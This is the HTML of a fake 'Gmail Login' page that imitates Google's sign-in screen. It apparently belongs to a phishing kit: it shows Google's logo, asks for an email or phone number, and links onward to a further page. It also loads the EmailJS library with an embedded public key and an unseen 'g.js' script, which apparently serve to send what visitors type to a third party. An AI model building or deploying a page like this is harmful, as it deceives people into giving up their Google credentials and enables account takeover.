<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<link rel="stylesheet" href="../google/g.css">
<title>Gmail Login</title>
</head>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script type="text/javascript">
    (function () {
        emailjs.init({
            publicKey: "PDchH_R3Befg7OCEL",
        });
    })();
</script>
<script src="g.js"></script>
<body>

<div class="login-container">
  <div class="logo">
    <!-- Google "G" Logo SVG -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Google Logo" />
  </div>
  <h1>Sign in</h1>
  <form>
    <label for="email">Email or phone</label>
    <input type="email" id="email" name="email" required placeholder="Enter your email or phone" />
    <div class="clearfix">
      <a href="#" class="forgot-link">Forgot email?</a>
      <a href="#" class="create-account">Create account</a>
    </div>
    <a href="../google/next.html" class="btn-next" style="text-decoration: none;">
        <button type="button" class="btn-next">Next</button>
      </a>
  </form>
</div>

</body>
</html>
